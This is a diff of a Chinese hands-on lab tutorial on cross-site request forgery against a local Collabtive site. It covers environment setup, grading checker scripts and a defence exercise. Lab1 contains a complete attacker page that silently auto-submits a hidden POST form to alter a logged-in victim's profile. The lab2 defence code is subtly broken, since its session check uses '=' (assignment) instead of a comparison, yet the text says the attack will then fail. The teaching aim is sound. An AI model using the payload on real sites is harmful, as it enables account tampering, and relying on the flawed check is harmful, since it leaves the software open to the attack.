@@ -23,7 +23,7 @@ CSRF攻击总是涉及到三个角色:信赖的网站(Collabtive),受害者的se
 5. web浏览器将自动连接会话cookie,因为它是恶意的要求针对可信站点。
 6. 受信任的站点如果受到CSRF攻击,攻击者的一些恶意的请求会被攻击者发送给信任站点。
 
-恶意网站可以建立HTTP GET或POST请求到受信任的站点。一些HTML标签,比如img iframe,框架,形式没有限制的URL,可以在他们的使用属性中。img,iframe,框架可用于锻造GET请求。HTML表单标签可用于构造                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    00000000000POST请求。构造GET请求是相对容易的,因为它甚至不需要JavaScript的帮助;构造POST请求需要JavaScript。因为Collabtive只针对后者,本实验室的任务将只涉及HTTP POST请求；
+恶意网站可以建立HTTP GET或POST请求到受信任的站点。一些HTML标签,比如img iframe,框架,形式没有限制的URL,可以在他们的使用属性中。img,iframe,框架可用于锻造GET请求。HTML表单标签可用于构造POST请求。构造GET请求是相对容易的,因为它甚至不需要JavaScript的帮助;构造POST请求需要JavaScript。因为Collabtive只针对后者,本实验室的任务将只涉及HTTP POST请求；
 
 
 ## 三、预备知识
@@ -46,8 +46,6 @@ sudo service apache2 start
 sudo mysqld_safe
 ```
 
-> sudo 密码：dees
-
 服务启动后的截图，请再打开其他终端执行后续命令。
 
 ![此处输入图片的描述](https://dn-anything-about-doc.qbox.me/document-uid13labid876timestamp1445515226388.png/wm)
@@ -58,144 +56,167 @@ sudo mysqld_safe
 sudo vim /etc/hosts
 ```
 
-
+````
+127.0.0.1	www.csrflabattacker.com
+127.0.0.1	www.csrflabcollabtive.com
+````
 
 ![图片描述信息](https://dn-anything-about-doc.qbox.me/userid13labid876time1429077109376?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
 
 网站配置：
 
-```
-sudo vim /etc/apache2/conf.d/lab1.conf
-```
+在 /etc/apache2/conf.d 目录下新建 lab.conf 文件：
 
-![图片描述信息](https://dn-anything-about-doc.qbox.me/userid13labid876time1429077154195?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
-
-重启服务：
-
-```
-sudo service apache2 restart
+```bash
+$ sudo vi /etc/apache2/conf.d/lab.conf
 ```
 
-访问测试：http://www.csrflabattacker.com
-
-![图片描述信息](https://dn-anything-about-doc.qbox.me/userid13labid876time1429077196640?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
-
-网站配置：
-
 ```
-sudo vim /etc/apache2/conf.d/lab2.conf
+<VirtualHost *:80>
+ServerName http://www.csrflabcollabtive.com
+DocumentRoot /var/www/CSRF/Collabtive/
+</VirtualHost>
+
+<VirtualHost *:8080>
+ServerName http://www.csrflabattacker.com
+DocumentRoot /var/www/CSRF/Attacker/
+</VirtualHost>
 ```
-
-![图片描述信息](https://dn-anything-about-doc.qbox.me/userid13labid876time1429077211496?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
-
-重启服务：
-
-```
-sudo service apache2 restart
-```
-
-访问测试:http://www.csrflabcollabtive.com
-
-
-![图片描述信息](https://dn-anything-about-doc.qbox.me/userid13labid876time1429077222967?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
-
-**注：两个配置文件不同同时存在，否则Apache会出错，如果需要测试，建议把其中一个的端口修改为8080**
 
 ![图片描述信息](https://dn-anything-about-doc.qbox.me/userid13labid876time1429077233024?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
 
+重启服务：
+
+```bash
+$ sudo service apache2 restart
+```
+
 这个时候我们就可以同时访问两个网站了~~~
+
+```checker
+- name: check hosts
+  script: |
+    #!/bin/bash
+    grep csrflabattacker /etc/hosts
+    grep csrflabcollabtive /etc/hosts
+  error: 没有配置/etc/hosts文件
+- name: check lab.conf
+  script: |
+    #!/bin/bash
+    ls /etc/apache2/conf.d/lab.conf
+    grep Attacker /etc/apache2/conf.d/lab.conf
+    grep 8080 /etc/apache2/conf.d/lab.conf
+  error: 没有lab.conf文件或者没有配置lab.conf文件
+- name: check mysqld_safe
+  script: |
+    #!/bin/bash
+    ps -ef |grep -v grep|grep mysqld_safe
+  error: 没有启动mysqld_safe
+- name: check apache2
+  script: |
+    #!/bin/bash
+    ps -ef |grep -v grep|grep apache2
+  error: 没有启动apache2
+```
 
 ## 四、实验任务
 
-实验环境介绍：第一个网站是脆弱Collabtive网站www.csrflabcollabtive.com在虚拟机访问。第二个网站是攻击者的恶意网站,用于攻击Collabtive。本网站内可以通过www.csrflabattacker.com访问虚拟机。
+实验环境介绍：第一个网站是脆弱的Collabtive网站www.csrflabcollabtive.com。第二个网站是攻击者的恶意网站www.csrflabattacker.com,用于攻击Collabtive。
 
-### lab1 修改受害者的信息
+### lab1 修改受害者的信息 
 
-step1:启动mysql数据库:
+step1:在开始之前，需要安装 livehttpheader 插件。点击浏览器的 tools-》add-ons ，在搜索框输入 live http header 就可以找到，点击 install 即可安装，安装后重启浏览器就可以了。我这里是已经安装了，截图如下：
 
-```
-sudo mysqld_safe
-```
+![3.4-1](https://dn-simplecloud.shiyanlou.com/uid/8797/1524647286699.png-wm)
 
 step2:访问 www.csrflabcollabtive.com并进行登录。
 
 >用户：admin 密码：admin
 
-step3:我们登陆了自己的用户，当我们希望可以修改别人的用户时，我们需要知道修改数据时的数据流，这个时候我们可以使用firefox浏览器自带的LiveHttpHeader插件来进行抓包获取修改用户时候的http消息；
+step3:我们登陆了自己的用户，当我们希望可以修改别人的用户时，我们需要知道修改数据时的数据流，这个时候我们可以使用firefox浏览器的LiveHttpHeader插件来进行抓包获取修改用户时候的http消息；
 
 点击菜单栏tools-LiveHttpHeader，然后访问编辑用户页面；
 
 ![图片描述信息](https://dn-anything-about-doc.qbox.me/userid13labid876time1429077485549?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
 
-![图片描述信息](https://dn-anything-about-doc.qbox.me/userid13labid876time1429077497500?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
+填写一些信息，如下图所示：
+
+![实验楼](https://dn-simplecloud.shiyanlou.com/87971525851500141-wm)
+
+再点击 send 按钮。在我们的 livehttpheader 窗口中可以找到类似下图的内容：
+
+![实验楼](https://dn-simplecloud.shiyanlou.com/87971525851451091-wm)
 
 通过抓取的信息，我们可以得知：
 
-验证页面：http://www.csfrlabcollabtive.com/manageuser.php?action=edit
+验证 url 为 http://www.csrflabcollabtive.com/manageuser.php?action=edit，各信息的对应名称也能看到，比如 userfile，company 等等。
 
-用户姓名id:name；company；email等等信息我们都可以进行修改；
-
-**这里最好使用其他用户进行测试**
-
-但是用户修改用户的方式post提交，我们就需要自己构造一个危险页面
+用户修改信息的方式是post提交，我们就需要自己构造一个危险页面。在 /var/www/CSRF/Attacker/ 文件夹下新建一个 index.html 文件，文件内容如下：
 
 ```
->     <html><body><h1>
->     This page forges an HTTP POST request.
->     </h1>
->     <script>
->     function post(url,fields)
->     {
->     //create a <formelement.
->     var p = document.createElement('form');
->     //construct the form
->     p.action = url;
->     p.innerHTML = fields;
->     p.target = '_self';
->     p.method = 'post';
->     //append the form to the current page.
->     document.body.appendChild(p);
->     //submit the form
->     p.submit();
->     }
->     function csrf_hack()
->     {
->     var fields;
->     // The following are form entries that need to be filled out
->     // by attackers. The entries are made hidden, so the victim
->     // won't be able to see them.
->     fields += "<input type='hidden' name='name' value='peter'>"; //修改用户名
->     fields += "<input type='hidden' name='userfile' value=''>";  
->     fields += "<input type='hidden' name='company' value='seed'>";  //修改公司名
->     post('http://www.csrflabcollabtive/manageuser.php?action=edit',fields);
->     }
->     // invoke csrf_hack() after the page is loaded.
->     window.onload = function() { csrf_hack(); }
->     </script>
->     </body></html>
+<html>
+
+<body>
+    <h1>
+        This page forges an HTTP POST request.
+    </h1>
+    <script type="text/javascript">
+        function post(url, fields) {
+            //create a <form> element.
+            var p = document.createElement("form");
+            //construct the form
+            p.action = url;
+            p.innerHTML = fields;
+            p.target = "_self";
+            p.method = "post";
+            //append the form to the current page.
+            document.body.appendChild(p);
+            //submit the form
+            p.submit();
+        }
+
+        function csrf_hack() {
+            var fields;
+            // The following are form entries that need to be filled out
+            // by attackers. The entries are made hidden, so the victim
+            // won't be able to see them.
+            fields += "<input type='hidden' name='name' value='admin' >"; 
+            fields += "<input type='hidden' name='gender' value='female' >"; //修改性别
+            fields += "<input type='hidden' name='company' value='seed' >"; //修改公司名
+            post('http://www.csrflabcollabtive.com/manageuser.php?action=edit', fields);
+        }
+        // invoke csrf_hack() after the page is loaded.
+        window.onload = function() {
+            csrf_hack();
+        }
+    </script>
+</body>
+
+</html>
 ```
 
-将上面的代码保存为index.html并放在/var/www/CSRF/Attacker/文件夹下，当用户没有退出，就去访问了www.csrflabattacker.com就会对collabtive网站的用户信息进行修改；下面进行测试：
-
-访问前，注意用户的姓名还有company：
-
-![图片描述信息](https://dn-anything-about-doc.qbox.me/userid13labid876time1429077513440?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
-
-访问攻击者页面，当然页面还可以进行变形做的更加隐秘，甚至让用户完全不能察觉：
-
-![图片描述信息](https://dn-anything-about-doc.qbox.me/userid13labid876time1429077535479?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
+当用户没有退出，就去访问了www.csrflabattacker.com 就会对collabtive网站的用户信息进行修改；
 
 再次查看用户信息，这个时候我们就会发现用户变成了我们的期望值了：
 
-![图片描述信息](https://dn-anything-about-doc.qbox.me/userid13labid876time1429077546857?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
+![实验楼](https://dn-simplecloud.shiyanlou.com/87971525851781473-wm)
 
 #### 原理解析 
 
 攻击者模拟一个页面进行自动提交，当用户访问这个页面时，相当于用户自己去修改信息，服务器不会判断是人发起的还是自动发起的，这个时候漏洞就产生了！
 
+```checker
+- name: check index.html
+  script: |
+    #!/bin/bash
+    ls /var/www/CSRF/Attacker/index.html
+    grep csrf_hack /var/www/CSRF/Attacker/index.html
+  error: /var/www/CSRF/Attacker 目录下不存在 index.html 或内容不对
+```
+
 ### lab2 对Collabtive实施防御对策 
 
-服务端防御：放映厅CSRF方式方法很多样，但总的思想都是一致的，就是在客户端页面增加伪随机数；
+服务端防御：防御CSRF方式方法很多样，但总的思想都是一致的，就是在客户端页面增加伪随机数；
 
 编辑验证文件
 
@@ -203,21 +224,65 @@ step3:我们登陆了自己的用户，当我们希望可以修改别人的用�
 sudo vim /var/www/CSRF/Collabtive/templates/standard/edituserform.tpl
 ```
 
-![图片描述信息](https://dn-anything-about-doc.qbox.me/userid13labid876time1429077560187?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
+选定一个位置添加如下代码：
 
-![图片描述信息](https://dn-anything-about-doc.qbox.me/userid13labid876time1429077568138?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
+```
+<input type="hidden" name="sid" value="">
+```
 
-保存并退出，然后修改manageuser.php文件
+截图如下：
 
-![图片描述信息](https://dn-anything-about-doc.qbox.me/userid13labid876time1429077576553?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
+![图片描述](https://dn-simplecloud.shiyanlou.com/uid/8797/1525852145590.png-wm)
 
-这一行是获取用户提交过来的sid值；添加位置可以适当变化；
+在提交处，将 cookie 赋值给 sid。修改如下代码：
 
-![图片描述信息](https://dn-anything-about-doc.qbox.me/userid13labid876time1429077583942?watermark/1/image/aHR0cDovL3N5bC1zdGF0aWMucWluaXVkbi5jb20vaW1nL3dhdGVybWFyay5wbmc=/dissolve/60/gravity/SouthEast/dx/0/dy/10)
+```
+<button type="submit" onclick="this.form.sid.value=document.cookie" onfocus="this.blur()">{#send#    }</button>  //在 223 行
+```
 
-这一行是对用户sid值进行判断，是否等于phpsessid的值，如果相等就可以进行对用户编辑，这样当攻击者想攻击时，就不能通过验证了；这里需要注意的是，if需要对整个编辑内容进行判断；所以要注意括号闭合的位置，应该是$action="edit"整个内容；
+截图如下：
+
+![图片描述](https://dn-simplecloud.shiyanlou.com/uid/8797/1525852495137.png-wm)
+
+按 `esc` 然后输入 `:wq` 保存并退出，然后修改 /var/www/CSRF/Collabtive/manageuser.php 文件，在里面添加如下代码：
+
+```
+$sid = getArrayVal($_POST,"sid");
+```
+
+截图如下：
+
+![图片描述](https://dn-simplecloud.shiyanlou.com/uid/8797/1525852797164.png-wm)
+
+还需要添加如下代码：
+
+```
+if($_COOKIE["PHPSESSID"]=$sid){ //可以添加在 203 行处
+
+} //注意这个闭合的花括号，添加位置在 275 行
+```
+
+截图如下：
+
+![图片描述](https://dn-simplecloud.shiyanlou.com/uid/8797/1525853375575.png-wm)
+
+>  这一行是对用户s id 值进行判断，是否等于 phpsessid 的值，如果相等就可以进行对用户编辑，这样当攻击者想攻击时，就不能通过验证了；这里需要注意的是，if 需要对整个编辑内容进行判断；所以要注意括号闭合的位置，应该是 $action="edit" 整个内容；
 
 然后我们再进行lab1中的实验，就会不成功了！
+
+```checker
+- name: check edituserform.tpl
+  script: |
+    #!/bin/bash
+    sed -n "223p" /var/www/CSRF/Collabtive/templates/standard/edituserform.tpl|grep onclick
+  error: 没有修改 edituserform.tpl 文件
+- name: check manageuser.php
+  script: |
+    #!/bin/bash
+    grep sid /var/www/CSRF/Collabtive/manageuser.php 
+    grep PHPSESSID /var/www/CSRF/Collabtive/manageuser.php 
+  error: 没有修改 manageuser.php
+```
 
 #### 原理 
 
@@ -232,8 +297,6 @@ sudo vim /var/www/CSRF/Collabtive/templates/standard/edituserform.tpl
 你需要提交一份详细的实验报告来描述你做了什么和你所学到的。
 
 请提供使用LiveHTTPHeaders Wiresharkde 细节或屏幕截图。
-
-
 
 ## license 
 
